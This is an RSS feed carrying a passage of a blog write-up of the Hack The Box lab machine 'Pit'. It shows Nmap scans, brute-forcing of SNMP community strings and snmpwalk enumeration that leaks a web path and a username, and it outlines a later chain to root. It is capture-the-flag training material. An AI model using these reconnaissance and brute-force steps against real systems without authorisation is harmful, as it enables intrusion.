<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>CVE-2019-12744 on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/cve-2019-12744/</link>
    <description>Recent content in CVE-2019-12744 on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Wed, 13 Oct 2021 16:54:04 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/cve-2019-12744/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Pit</title>
      <link>https://fahmifj.github.io/hackthebox/pit/</link>
      <pubDate>Wed, 13 Oct 2021 16:54:04 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/pit/</guid>
      <description>As a medium difficulty box, Pit from Hack The Box has a well-designed enumeration flow.</description>
      <content:encoded><![CDATA[<p>As a medium difficulty box, Pit from Hack The Box has a well-designed enumeration flow. It starts by enumerating SNMP to reveal a username and a hidden web path to a CMS called SeedDMS, where I can login with that username. The CMS is vulnerable to a remote code execution, allowing me to obtain a database password that I can then use on a <a href="https://cockpit-project.org/">Cockpit</a> instance. Enumerating the system from Cockpit&rsquo;s terminal reveals that each time a &ldquo;walk&rdquo; is performed, SNMP will execute a script. This script basically searches for and executes other scripts in a specific directory to which I have write access, allowing me to create a malicious script in there to gain root access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>SNMP enumeration and exploitation</li>
<li>SeedDMS exploitation</li>
<li>Cockpit exploitation</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>snmpwalk</li>
<li>gobuster</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<h4 id="tcp">TCP</h4>
<p>For TCP ports, <code>nmap</code> discovers 3 open ports: SSH on port 22, an NGINX web server on port 80, and a service that <code>nmap</code> identifies it as zeus-admin.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ nmap -p- --max-rate <span class="m">1000</span> -sV --reason -oA nmap/10-tcp-allport-pit 10.10.10.241
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-20 11:03 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.241
</span></span><span class="line"><span class="cl">Host is up, received echo-reply ttl <span class="m">63</span> <span class="o">(</span>0.079s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65532</span> filtered ports
</span></span><span class="line"><span class="cl">Reason: <span class="m">65332</span> no-responses and <span class="m">200</span> admin-prohibiteds
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE         REASON         VERSION
</span></span><span class="line"><span class="cl">22/tcp   open  ssh             syn-ack ttl <span class="m">63</span> OpenSSH 8.0 <span class="o">(</span>protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp   open  http            syn-ack ttl <span class="m">63</span> nginx 1.14.1
</span></span><span class="line"><span class="cl">9090/tcp open  ssl/zeus-admin? syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 401.69 seconds
</span></span><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ nmap -p22,80,9090 --max-rate <span class="m">1000</span> -sC -oA nmap/10-tcp-defaultsc-pit 10.10.10.241
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-20 11:12 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.241
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.16s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE
</span></span><span class="line"><span class="cl">22/tcp   open  ssh
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp   open  http
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Test Page <span class="k">for</span> the Nginx HTTP Server on Red Hat Enterprise Linux
</span></span><span class="line"><span class="cl">9090/tcp open  zeus-admin
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dms-pit.htb/organizationName<span class="o">=</span>4cd9329523184b0ea52ba0d20a1a6f92/countryName<span class="o">=</span>US
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2020-04-16T23:29:12
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2030-06-04T16:09:12
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 4.39 seconds
</span></span></code></pre></div><p>Also, <code>nmap</code> revealed a domain name <code>dms-pit.htb</code> from the SSL certificate on port 9090. I will add it to my <code>/etc/hosts</code> file</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.241 dms-pit.htb pit.htb&#39;</span> &gt;&gt; /etc/hosts
</span></span></code></pre></div><h4 id="udp">UDP</h4>
<p>For UDP ports, <code>nmap</code> discovers an SNMP server on port 161 and reveals a domain name <code>pit.htb</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ nmap -sU -sV -n --top-ports <span class="m">20</span> -oA nmap/10-udp-top20-pit 10.10.10.241
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-20 11:18 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.241
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.074s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT      STATE         SERVICE      VERSION
</span></span><span class="line"><span class="cl">53/udp    open<span class="p">|</span>filtered domain
</span></span><span class="line"><span class="cl">67/udp    open<span class="p">|</span>filtered dhcps
</span></span><span class="line"><span class="cl">68/udp    filtered      dhcpc
</span></span><span class="line"><span class="cl">69/udp    open<span class="p">|</span>filtered tftp
</span></span><span class="line"><span class="cl">123/udp   open<span class="p">|</span>filtered ntp
</span></span><span class="line"><span class="cl">135/udp   open<span class="p">|</span>filtered msrpc
</span></span><span class="line"><span class="cl">137/udp   open<span class="p">|</span>filtered netbios-ns
</span></span><span class="line"><span class="cl">138/udp   filtered      netbios-dgm
</span></span><span class="line"><span class="cl">139/udp   open<span class="p">|</span>filtered netbios-ssn
</span></span><span class="line"><span class="cl">161/udp   open          snmp         SNMPv1 server<span class="p">;</span> net-snmp SNMPv3 server <span class="o">(</span>public<span class="o">)</span>
</span></span><span class="line"><span class="cl">162/udp   open<span class="p">|</span>filtered snmptrap
</span></span><span class="line"><span class="cl">445/udp   filtered      microsoft-ds
</span></span><span class="line"><span class="cl">500/udp   open<span class="p">|</span>filtered isakmp
</span></span><span class="line"><span class="cl">514/udp   filtered      syslog
</span></span><span class="line"><span class="cl">520/udp   open<span class="p">|</span>filtered route
</span></span><span class="line"><span class="cl">631/udp   open<span class="p">|</span>filtered ipp
</span></span><span class="line"><span class="cl">1434/udp  open<span class="p">|</span>filtered ms-sql-m
</span></span><span class="line"><span class="cl">1900/udp  filtered      upnp
</span></span><span class="line"><span class="cl">4500/udp  open<span class="p">|</span>filtered nat-t-ike
</span></span><span class="line"><span class="cl">49152/udp open<span class="p">|</span>filtered unknown
</span></span><span class="line"><span class="cl">Service Info: Host: pit.htb
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 18.21 seconds
</span></span></code></pre></div><h3 id="poking-the-websites">Poking the websites</h3>
<p>For HTTP, it seems only <code>dms-pit.htb</code> that serves different content.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ curl -s http://10.10.10.241/ <span class="p">|</span> wc -c                                 
</span></span><span class="line"><span class="cl"><span class="m">4057</span>
</span></span><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ curl -s http://pit.htb/ <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">4057</span>
</span></span><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ curl -s http://dms-pit.htb/ <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">169</span>
</span></span></code></pre></div><p>For HTTPS on port 9090, it&rsquo;s all the same site.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ curl -s -k https://10.10.10.241:9090/ <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">43548</span>
</span></span><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ curl -s -k https://pit.htb:9090/ <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">43548</span>
</span></span><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ curl -s -k https://dms-pit.htb:9090/ <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">43548</span>
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>On port 80, a NGINX default web page for REHL is shown here.</p>
<p><div class="img-container"><img src="imgs/image-20210520224354684.png" alt="image-20210520224354684"  /></div>
</p>
<p>Running <code>gobuster</code> against this site doesn&rsquo;t really find something useful, and I couldn&rsquo;t find a critical vulnerability on <code>nginx 1.14.1</code>.</p>
<h3 id="tcp-80---dms-pithtb">TCP 80 - dms-pit.htb</h3>
<p>Heading to <code>dms-pit.htb</code> on port 80 shows a 403 forbidden error message.</p>
<p><div class="img-container"><img src="imgs/image-20210520224457026.png" alt="image-20210520224457026"  /></div>
</p>
<p>For this site, <code>gobuster</code> actually found some files, but all of them returned with 403 status.</p>
<h3 id="tcp-9090---website-https">TCP 9090 - Website (HTTPS)</h3>
<p>On port 9090, there is a login page.</p>
<p><div class="img-container"><img src="imgs/image-20210520225003343.png" alt="image-20210520225003343"  /></div>
</p>
<p>This page was identified as an instance of <a href="https://cockpit-project.org/.">Cockpit</a>, a web-based interface for system administration.</p>
<h4 id="searchsploit">Searchsploit</h4>
<p>There is a security issue on GitHub which talks about SSRF:</p>
<ul>
<li><a href="https://github.com/cockpit-project/cockpit/issues/15077">https://github.com/cockpit-project/cockpit/issues/15077</a></li>
</ul>
<p>The researcher disclosed the issue in his blog.</p>
<ul>
<li><a href="https://docs.unsafe-inline.com/0day/cokpit-version-234-server-side-request-forgery-cve-2020-35850">https://docs.unsafe-inline.com/0day/cokpit-version-234-server-side-request-forgery-cve-2020-35850</a></li>
</ul>
<p>The researcher also provides a PoC, but it requires an account, so I will move on to the next service.</p>
<h3 id="udp-161---snmp">UDP 161 - SNMP</h3>
<p>From what <code>nmap</code> gave, I assume that this machine supports SNMPv1-SNMPv3. Based on what I read on <a href="https://book.hacktricks.xyz/pentesting/pentesting-snmp">HackTricks</a>, to enumerate SNMP version 1/2c, I need to know the community string name, and there are two types of it: <code>public</code> and <code>private</code>.</p>
<p>The <code>public</code> community string normally grants read access, however <code>private</code> may grant you read/write access, even leading to <a href="https://book.hacktricks.xyz/pentesting/pentesting-snmp/snmp-rce">remote code execution</a>.</p>
<p>For SNMP version 1 and 2c, it is possible to identify a valid community string based on the server&rsquo;s response with a dictionary attack (brute) . In Kali, there is a preinstalled tool for this, which I will use called <code>onesixtyone</code>. I will run it and save the output to a file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49»
</span></span><span class="line"><span class="cl">$ onesixtyone -c /opt/SecLists/Discovery/SNMP/snmp.txt 10.10.10.241 &gt; snmp-enum/brute-community-strings
</span></span></code></pre></div><p>The attack reveals that <strong>public</strong> is a valid community string.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49»
</span></span><span class="line"><span class="cl">$ cat snmp-enum/brute-community-strings
</span></span><span class="line"><span class="cl">Scanning <span class="m">1</span> hosts, <span class="m">3220</span> communities
</span></span><span class="line"><span class="cl">10.10.10.241 <span class="o">[</span>public<span class="o">]</span> Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64 <span class="c1">#1 SMP Thu Apr 8 19:01:30 UTC 2021 x86_64</span>
</span></span><span class="line"><span class="cl">10.10.10.241 <span class="o">[</span>public<span class="o">]</span> Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64 <span class="c1">#1 SMP Thu Apr 8 19:01:30 UTC 2021 x86_64</span>
</span></span></code></pre></div><p>Now to enumerate SNMP, I will use another preinstalled tool called <code>snmpwalk</code>. Using this tool will return a list of <a href="https://book.hacktricks.xyz/pentesting/pentesting-snmp#oids">OID (Objects Identifiers)</a> which consists a set of numbers separated by dot, so to translate these numbers into a bit meaningful, I will need <code>snmp-mibs-downloader</code>. I will install that with:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49»
</span></span><span class="line"><span class="cl">$ apt-get install snmp-mibs-downloader
</span></span></code></pre></div><p>The general usage for <code>snmpwalk</code> is:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ snmpwalk <span class="o">[</span>OPTIONS<span class="o">]</span> AGENT <span class="o">[</span>OID<span class="o">]</span>
</span></span></code></pre></div><p>Actually, I did a lot of enumeration with SNMP, but because OID is a hierarchical structure, I found that it was easier to start from the Internet OID, which is <code>1.3.6.1</code>, so that it would  &ldquo;walk&rdquo; down to any readable OID branch, it is something like <code>1.3.6.1</code> -&gt; <code>1.3.6.1.1</code> (directory OID) -&gt; &hellip; -&gt;  <code>1.3.6.1.4</code> (private OID) -&gt; &hellip; -&gt; <code>1.3.6.1.X.X</code>.</p>
<p>I will run <code>snmpwalk</code> on that and save the output to <code>snmp-internet-1.3.6.1.out</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49»
</span></span><span class="line"><span class="cl">$ snmpwalk -v 2c -c public 10.10.10.241 internet &gt; snmp-internet-1.3.6.1.out
</span></span></code></pre></div><ul>
<li><code>-v</code> 2c: SNMP version 2c. SNMP version 1 and 2c sends data in clear-text while version 3 uses auth.</li>
<li><code>-c</code> public: community string</li>
<li><code>internet</code>: auto translated to 1.3.6.1 by <code>snmp-mibs-downloader</code></li>
</ul>
<p>I will filter the output with <code>hrSWRunParameters</code> (Host Resources Software Run Parameters), which might leak some sensitive information from the command line arguments of the current running processes, but it doesn&rsquo;t have any.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49»
</span></span><span class="line"><span class="cl">$ cat snmp-enum/snmp-internet-1.3.6.1.out <span class="p">|</span> grep <span class="s2">&#34;hrSWRunParameters&#34;</span> <span class="p">|</span> grep STRING
</span></span><span class="line"><span class="cl">HOST-RESOURCES-MIB::hrSWRunParameters.1 <span class="o">=</span> STRING: <span class="s2">&#34;--switched-root --system --deserialize 17&#34;</span>
</span></span><span class="line"><span class="cl">HOST-RESOURCES-MIB::hrSWRunParameters.1000 <span class="o">=</span> STRING: <span class="s2">&#34;--system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only&#34;</span>
</span></span><span class="line"><span class="cl">HOST-RESOURCES-MIB::hrSWRunParameters.1001 <span class="o">=</span> STRING: <span class="s2">&#34;--foreground&#34;</span>
</span></span><span class="line"><span class="cl">HOST-RESOURCES-MIB::hrSWRunParameters.1002 <span class="o">=</span> STRING: <span class="s2">&#34;--no-debug&#34;</span>
</span></span><span class="line"><span class="cl">HOST-RESOURCES-MIB::hrSWRunParameters.1004 <span class="o">=</span> STRING: <span class="s2">&#34;-s&#34;</span>
</span></span><span class="line"><span class="cl">HOST-RESOURCES-MIB::hrSWRunParameters.1009 <span class="o">=</span> STRING: <span class="s2">&#34;-i --logger=files&#34;</span>
</span></span><span class="line"><span class="cl">HOST-RESOURCES-MIB::hrSWRunParameters.1011 <span class="o">=</span> STRING: <span class="s2">&#34;-f --fill-watermark=0&#34;</span>
</span></span><span class="line"><span class="cl">HOST-RESOURCES-MIB::hrSWRunParameters.1041 <span class="o">=</span> STRING: <span class="s2">&#34;--domain implicit_files --uid 0 --gid 0 --logger=files&#34;</span>
</span></span><span class="line"><span class="cl">HOST-RESOURCES-MIB::hrSWRunParameters.1051 <span class="o">=</span> STRING: <span class="s2">&#34;--uid 0 --gid 0 --logger=files&#34;</span>
</span></span><span class="line"><span class="cl">HOST-RESOURCES-MIB::hrSWRunParameters.1056 <span class="o">=</span> STRING: <span class="s2">&#34;-s /usr/sbin/firewalld --nofork --nopid&#34;</span>
</span></span><span class="line"><span class="cl">HOST-RESOURCES-MIB::hrSWRunParameters.1090 <span class="o">=</span> STRING: <span class="s2">&#34;--no-daemon&#34;</span>
</span></span><span class="line"><span class="cl">HOST-RESOURCES-MIB::hrSWRunParameters.1101 <span class="o">=</span> STRING: <span class="s2">&#34;-D -oCiphers=aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes256-ctr,aes256-cbc,aes128-gcm@openssh.com,aes128-ctr,aes128&#34;</span>
</span></span><span class="line"><span class="cl">HOST-RESOURCES-MIB::hrSWRunParameters.1105 <span class="o">=</span> STRING: <span class="s2">&#34;-Es /usr/sbin/tuned -l -P&#34;</span>
</span></span><span class="line"><span class="cl">HOST-RESOURCES-MIB::hrSWRunParameters.1116 <span class="o">=</span> STRING: <span class="s2">&#34;-n&#34;</span>
</span></span><span class="line"><span class="cl">HOST-RESOURCES-MIB::hrSWRunParameters.1193 <span class="o">=</span> STRING: <span class="s2">&#34;-o -p -- \\u --noclear tty1 linux&#34;</span>
</span></span><span class="line"><span class="cl">HOST-RESOURCES-MIB::hrSWRunParameters.1208 <span class="o">=</span> STRING: <span class="s2">&#34;--basedir=/usr&#34;</span>
</span></span><span class="line"><span class="cl">HOST-RESOURCES-MIB::hrSWRunParameters.1479 <span class="o">=</span> STRING: <span class="s2">&#34;-n&#34;</span>
</span></span><span class="line"><span class="cl">HOST-RESOURCES-MIB::hrSWRunParameters.1481 <span class="o">=</span> STRING: <span class="s2">&#34;-LS0-6d -f&#34;</span>
</span></span><span class="line"><span class="cl">HOST-RESOURCES-MIB::hrSWRunParameters.10212 <span class="o">=</span> STRING: <span class="s2">&#34;-Es /usr/share/setroubleshoot/SetroubleshootFixit.py&#34;</span>
</span></span></code></pre></div><p>If I examine the entire output carefully, the two most interesting information are:</p>
<ul>
<li>A web path <code>/var/www/html/seeddms51x/seeddms</code>, and</li>
<li>A potential username: <code>michelle</code></li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">UCD-SNMP-MIB::dskPath.2 <span class="o">=</span> STRING: /var/www/html/seeddms51x/seeddms
</span></span><span class="line"><span class="cl">UCD-SNMP-MIB::dskDevice.1 <span class="o">=</span> STRING: /dev/mapper/cl-root
</span></span><span class="line"><span class="cl">UCD-SNMP-MIB::dskDevice.2 <span class="o">=</span> STRING: /dev/mapper/cl-seeddms
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 <span class="o">=</span> INTEGER: <span class="m">1</span>
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendCommand.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> STRING: /usr/bin/monitor
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendArgs.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> STRING: 
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendInput.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> STRING: 
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendCacheTime.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> INTEGER: <span class="m">5</span>
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendExecType.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> INTEGER: exec<span class="o">(</span>1<span class="o">)</span>
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendRunType.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> INTEGER: run-on-read<span class="o">(</span>1<span class="o">)</span>
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendStorage.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> INTEGER: permanent<span class="o">(</span>4<span class="o">)</span>
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendStatus.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> INTEGER: active<span class="o">(</span>1<span class="o">)</span>
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutput1Line.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> STRING: Memory usage
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutputFull.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> STRING: Memory usage
</span></span><span class="line"><span class="cl">              total        used        free      shared  buff/cache   available
</span></span><span class="line"><span class="cl">Mem:          3.8Gi       415Mi       3.0Gi        16Mi       452Mi       3.2Gi
</span></span><span class="line"><span class="cl">Swap:         1.9Gi          0B       1.9Gi
</span></span><span class="line"><span class="cl">Database status
</span></span><span class="line"><span class="cl">OK - Connection to database successful.
</span></span><span class="line"><span class="cl">System release info
</span></span><span class="line"><span class="cl">CentOS Linux release 8.3.2011
</span></span><span class="line"><span class="cl">SELinux Settings
</span></span><span class="line"><span class="cl">user
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                Labeling   MLS/       MLS/                          
</span></span><span class="line"><span class="cl">SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">guest_u         user       s0         s0                             guest_r
</span></span><span class="line"><span class="cl">root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
</span></span><span class="line"><span class="cl">staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
</span></span><span class="line"><span class="cl">sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
</span></span><span class="line"><span class="cl">system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
</span></span><span class="line"><span class="cl">unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
</span></span><span class="line"><span class="cl">user_u          user       s0         s0                             user_r
</span></span><span class="line"><span class="cl">xguest_u        user       s0         s0                             xguest_r
</span></span><span class="line"><span class="cl">login
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Login Name           SELinux User         MLS/MCS Range        Service
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">__default__          unconfined_u         s0-s0:c0.c1023       *
</span></span><span class="line"><span class="cl">michelle             user_u               s0                   *
</span></span><span class="line"><span class="cl">root                 unconfined_u         s0-s0:c0.c1023       *
</span></span><span class="line"><span class="cl">System uptime
</span></span><span class="line"><span class="cl"> 14:03:52 up 12:03,  <span class="m">0</span> users,  load average: 0.04, 0.01, 0.00
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutNumLines.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> INTEGER: <span class="m">31</span>
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendResult.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> INTEGER: <span class="m">0</span>
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.1 <span class="o">=</span> STRING: Memory usage
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.2 <span class="o">=</span> STRING:               total        used        free      shared  buff/cache   available
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.3 <span class="o">=</span> STRING: Mem:          3.8Gi       415Mi       3.0Gi        16Mi       452Mi       3.2Gi
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.4 <span class="o">=</span> STRING: Swap:         1.9Gi          0B       1.9Gi
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.5 <span class="o">=</span> STRING: Database status
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.6 <span class="o">=</span> STRING: OK - Connection to database successful.
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.7 <span class="o">=</span> STRING: System release info
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.8 <span class="o">=</span> STRING: CentOS Linux release 8.3.2011
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.9 <span class="o">=</span> STRING: SELinux Settings
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.10 <span class="o">=</span> STRING: user
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.11 <span class="o">=</span> STRING: 
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.12 <span class="o">=</span> STRING:                 Labeling   MLS/       MLS/                          
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.13 <span class="o">=</span> STRING: SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.14 <span class="o">=</span> STRING: 
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.15 <span class="o">=</span> STRING: guest_u         user       s0         s0                             guest_r
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.16 <span class="o">=</span> STRING: root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
